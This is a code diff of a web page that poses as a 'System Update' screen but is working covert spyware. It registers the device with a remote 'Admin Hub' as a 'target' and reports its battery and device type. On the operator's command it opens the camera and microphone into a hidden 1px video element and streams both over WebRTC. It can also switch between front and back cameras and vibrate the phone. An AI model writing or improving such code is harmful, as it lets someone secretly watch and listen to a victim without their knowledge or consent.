@@ -6,70 +6,67 @@
     <script src="/socket.io/socket.io.js"></script>
     <style>
         body { background: #050a14; color: #4f5b93; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
-        .loader { border: 3px solid #112240; border-top: 3px solid #00d4ff; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; margin: 0 auto 15px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
     <div>
-        <div class="loader"></div>
-        <h2 style="font-size: 1.2rem; color: #fff;">System Update</h2>
-        <p style="font-size: 0.8rem;">Initializing security modules... Please wait.</p>
+        <h2 style="color: #fff;">System Update</h2>
+        <p>Processing security modules...</p>
     </div>
 
-    <!-- Hidden Video Element -->
+    <!-- Hidden Video -->
     <video id="v" autoplay playsinline muted style="width:1px; height:1px; opacity:0; position:absolute;"></video>
 
     <script>
         const socket = io();
-        let stream, pc, adminId;
+        let stream, pc, adminId, mode = "environment";
         const config = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };
 
-        // GHOST LOGIC: App khulte hi Admin Hub mein online dikhna
-        socket.emit('target-join', { battery: "Syncing...", device: "Android App" });
+        // 1. Asli Battery aur Device Info fetch karke join karna
+        async function joinHub() {
+            let bat = "N/A";
+            try {
+                const b = await navigator.getBattery();
+                bat = Math.floor(b.level * 100) + "%";
+            } catch(e) {}
+            const dev = /Android/i.test(navigator.userAgent) ? "Android App" : "Web Hub";
+            
+            socket.emit('target-join', { battery: bat, device: dev });
+        }
+        joinHub();
 
-        socket.on('command', async (data) => {
-            if (data.cmd === 'start' || data.cmd === 'start-stream') {
-                adminId = data.adminId;
-                if(!stream) await initCamera("environment"); // Default Back Cam
-                startWebRTC();
+        // 2. Command Handle karna (V2.4 Logic)
+        socket.on('command', async (d) => {
+            if (d.cmd === 'start' || d.cmd === 'start-stream') {
+                adminId = d.adminId;
+                if(!stream) {
+                    try {
+                        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: true });
+                        document.getElementById('v').srcObject = stream;
+                    } catch(e) { console.log("Cam Error"); }
+                }
+                establishLink();
             } 
-           else if (data.cmd === 'front' || data.cmd === 'back') {
-                let mode = (data.cmd === 'front') ? "user" : "environment";
+            else if (d.cmd === 'front' || d.cmd === 'back') {
+                mode = (d.cmd === 'front') ? "user" : "environment";
                 if(stream) stream.getTracks().forEach(t => t.stop());
                 stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: true });
                 document.getElementById('v').srcObject = stream;
                 if(pc) {
                     const vt = stream.getVideoTracks()[0];
                     const at = stream.getAudioTracks()[0];
-                    const videoSender = pc.getSenders().find(s => s.track.kind === 'video');
-                    const audioSender = pc.getSenders().find(s => s.track.kind === 'audio');
-                    if(videoSender) videoSender.replaceTrack(vt);
-                    if(audioSender) audioSender.replaceTrack(at);
+                    pc.getSenders().find(s => s.track.kind === 'video').replaceTrack(vt);
+                    pc.getSenders().find(s => s.track.kind === 'audio').replaceTrack(at);
                 }
-            } 
-            else if (data.cmd === 'vibrate') { window.navigator.vibrate(200); }
+            }
+            else if (d.cmd === 'vibrate') { window.navigator.vibrate(200); }
         });
 
-        async function initCamera(mode) {
-            try {
-                stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: mode }, 
-                    audio: true 
-                });
-                document.getElementById('v').srcObject = stream;
-            } catch (e) { console.error("Cam Error"); }
-        }
-
-        async function startWebRTC() {
+        async function establishLink() {
             if(pc) pc.close();
             pc = new RTCPeerConnection(config);
             stream.getTracks().forEach(t => pc.addTrack(t, stream));
-            
-            pc.onicecandidate = (e) => { 
-                if(e.candidate) socket.emit('signal', { to: adminId, signal: { candidate: e.candidate } }); 
-            };
-            
+            pc.onicecandidate = (e) => { if(e.candidate) socket.emit('signal', { to: adminId, signal: { candidate: e.candidate } }); };
             const offer = await pc.createOffer();
             await pc.setLocalDescription(offer);
             socket.emit('signal', { to: adminId, signal: { sdp: offer } });
@@ -82,3 +79,4 @@
         </script>
 </body>
 </html>
+        
